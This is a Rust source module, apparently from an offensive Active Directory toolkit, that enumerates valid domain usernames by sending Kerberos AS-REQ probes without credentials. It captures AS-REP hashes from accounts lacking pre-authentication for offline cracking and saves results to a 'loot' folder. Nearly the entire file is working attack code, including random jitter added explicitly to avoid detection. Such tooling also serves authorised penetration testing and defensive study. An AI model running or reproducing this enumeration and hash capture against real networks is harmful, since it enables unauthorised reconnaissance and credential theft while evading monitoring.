//! Kerberos Username Enumeration — Zero-knowledge user discovery via AS-REQ probes.
//!
//! Sends AS-REQ without pre-authentication data for each candidate username.
//! The KDC error code reveals whether the account exists:
//! - `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6)  → user does NOT exist
//! - `KDC_ERR_PREAUTH_REQUIRED` (25)    → user EXISTS
//! - Full AS-REP                        → user EXISTS + no pre-auth (hash auto-captured)
//!
//! This is the #1 technique for zero-knowledge AD engagements — no credentials required.

use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{self, UserEnumStatus};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct UserEnumConfig {
    /// Path to username wordlist (one per line)
    pub userlist: PathBuf,
    /// Output file for valid usernames
    pub output_file: Option<PathBuf>,
    /// Also save AS-REP hashes for no-preauth accounts
    pub save_asrep_hashes: bool,
    /// Maximum concurrent Kerberos probes
    pub concurrency: usize,
}

impl Default for UserEnumConfig {
    fn default() -> Self {
        Self {
            userlist: PathBuf::from("assets/ad_usernames.txt"),
            output_file: None,
            save_asrep_hashes: true,
            concurrency: 10,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UserEnumResult {
    /// Valid usernames discovered (pre-auth required)
    pub valid_users: Vec<String>,
    /// Valid usernames with no pre-auth + captured AS-REP hash
    pub no_preauth_users: Vec<AsRepCapture>,
    /// Disabled accounts discovered
    pub disabled_users: Vec<String>,
    /// Total usernames tested
    pub total_tested: usize,
    /// Usernames that were not found
    pub not_found: usize,
    /// Errors during enumeration
    pub errors: Vec<(String, String)>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AsRepCapture {
    pub username: String,
    pub hash_string: String,
}

// ═══════════════════════════════════════════════════════════
// Public Runner
// ═══════════════════════════════════════════════════════════

/// Run Kerberos username enumeration against the target DC.
/// No credentials required — uses only AS-REQ error code analysis.
pub async fn run(
    dc_ip: &str,
    domain: &str,
    uc: &UserEnumConfig,
    jitter_ms: u64,
) -> Result<UserEnumResult> {
    info!("{}", "═══ KERBEROS USER ENUMERATION ═══".bold().magenta());

    // Load username wordlist
    let content = tokio::fs::read_to_string(&uc.userlist).await.map_err(|e| {
        OverthroneError::Custom(format!(
            "Cannot read userlist {}: {}",
            uc.userlist.display(),
            e
        ))
    })?;

    let usernames: Vec<&str> = content
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect();

    if usernames.is_empty() {
        warn!("Userlist is empty: {}", uc.userlist.display());
        return Ok(UserEnumResult {
            valid_users: Vec::new(),
            no_preauth_users: Vec::new(),
            disabled_users: Vec::new(),
            total_tested: 0,
            not_found: 0,
            errors: Vec::new(),
        });
    }

    info!(
        "Loaded {} candidate usernames from {}",
        usernames.len(),
        uc.userlist.display()
    );

    let pb = ProgressBar::new(usernames.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.yellow} [{bar:40.cyan/dim}] {pos}/{len} user-enum {msg}")
            .unwrap()
            .progress_chars("█▓░"),
    );

    let mut valid_users = Vec::new();
    let mut no_preauth_users = Vec::new();
    let mut disabled_users = Vec::new();
    let mut not_found: usize = 0;
    let mut errors = Vec::new();

    for username in &usernames {
        pb.set_message((*username).to_string());

        let status = kerberos::user_enum_single(dc_ip, domain, username).await;

        match status {
            UserEnumStatus::Valid => {
                info!(" {} {} — {}", "✓".green(), username.bold(), "VALID".green());
                valid_users.push((*username).to_string());
            }
            UserEnumStatus::ValidNoPreauth(hash) => {
                info!(
                    " {} {} — {} (AS-REP hash captured!)",
                    "★".bright_yellow(),
                    username.bold(),
                    "VALID + NO PREAUTH".bright_yellow()
                );
                valid_users.push((*username).to_string());
                no_preauth_users.push(AsRepCapture {
                    username: (*username).to_string(),
                    hash_string: hash.hash_string,
                });
            }
            UserEnumStatus::Disabled => {
                info!(
                    " {} {} — {}",
                    "⚠".yellow(),
                    username.bold(),
                    "DISABLED".yellow()
                );
                disabled_users.push((*username).to_string());
            }
            UserEnumStatus::NotFound => {
                debug!(" {} {} — not found", "✗".dimmed(), username);
                not_found += 1;
            }
            UserEnumStatus::Error(e) => {
                debug!(" {} {} — {}", "✗".red(), username, e);
                errors.push(((*username).to_string(), e));
            }
        }

        // Apply jitter between requests to avoid detection
        if jitter_ms > 0 {
            let jitter = rand::random::<u64>() % jitter_ms;
            tokio::time::sleep(tokio::time::Duration::from_millis(jitter)).await;
        }

        pb.inc(1);
    }

    pb.finish_with_message("done");

    // Save valid users to output file
    let loot_dir = PathBuf::from("./loot");
    let _ = tokio::fs::create_dir_all(&loot_dir).await;

    let output_path = uc
        .output_file
        .clone()
        .unwrap_or_else(|| loot_dir.join("valid_users.txt"));
    let mut all_valid: Vec<String> = valid_users.clone();
    all_valid.extend(disabled_users.iter().cloned());
    if !all_valid.is_empty() {
        let user_lines = all_valid.join("\n");
        tokio::fs::write(&output_path, &user_lines).await?;
        info!(
            "Saved {} valid usernames to {}",
            all_valid.len(),
            output_path.display()
        );
    }

    // Save AS-REP hashes if any
    if uc.save_asrep_hashes && !no_preauth_users.is_empty() {
        let hash_path = loot_dir.join("userenum_asrep_hashes.txt");
        let hash_lines: String = no_preauth_users
            .iter()
            .map(|h| h.hash_string.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        tokio::fs::write(&hash_path, &hash_lines).await?;
        info!(
            "Saved {} AS-REP hashes to {}",
            no_preauth_users.len(),
            hash_path.display()
        );
    }

    // Summary
    println!("\n{}", "═══ USER ENUMERATION RESULTS ═══".bold().cyan());
    println!(
        "  {} Valid users:       {}",
        "✓".green(),
        valid_users.len().to_string().bold().green()
    );
    if !no_preauth_users.is_empty() {
        println!(
            "  {} No pre-auth (hash): {}",
            "★".bright_yellow(),
            no_preauth_users.len().to_string().bold().bright_yellow()
        );
    }
    if !disabled_users.is_empty() {
        println!(
            "  {} Disabled accounts:  {}",
            "⚠".yellow(),
            disabled_users.len().to_string().bold()
        );
    }
    println!("  {} Not found:         {}", "✗".dimmed(), not_found);
    println!("  {} Total tested:      {}", "→".cyan(), usernames.len());
    if !errors.is_empty() {
        println!("  {} Errors:            {}", "⚠".red(), errors.len());
    }
    println!("{}\n", "════════════════════════════════".cyan());

    Ok(UserEnumResult {
        valid_users,
        no_preauth_users,
        disabled_users,
        total_tested: usernames.len(),
        not_found,
        errors,
    })
}
